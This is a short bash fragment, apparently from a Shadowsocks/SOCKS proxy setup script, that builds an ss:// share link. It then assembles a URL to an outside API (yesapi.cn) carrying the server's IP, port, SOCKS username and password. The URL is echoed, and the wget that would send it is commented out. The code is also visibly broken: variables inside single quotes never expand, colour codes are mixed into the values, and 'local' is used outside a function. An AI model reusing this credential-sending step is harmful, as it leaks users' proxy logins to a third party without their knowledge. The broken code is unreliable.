#!/bin/bash
	[[ -z $ip ]] && get_ip
local ss="ss://$(echo -n "${ssciphers}:${sspass}@${ip}:${ssport}" | base64 -w 0)#233v2.com_ss_${ip}"
ip=$cyan${ip}$none
duankou=$cyan$socks_port$none
id_name=$cyan$socks_username$none
id_password=$cyan$socks_userpass$none
url='http://hn216.api.yesapi.cn/?s=App.Table.CheckCreate&return_data=0&model_name=shiqi&check_field=ip&app_key=FC7D346F24DF8C0FA3D71D6E73D1D6DC&sign=127EEA43B89A6617C26FE1307806A683&data={"ip":"$ip","duankou":"$duankou","id_name":"$id_name","id_password":"$id_password"}'
echo $url 
#wget -q $url
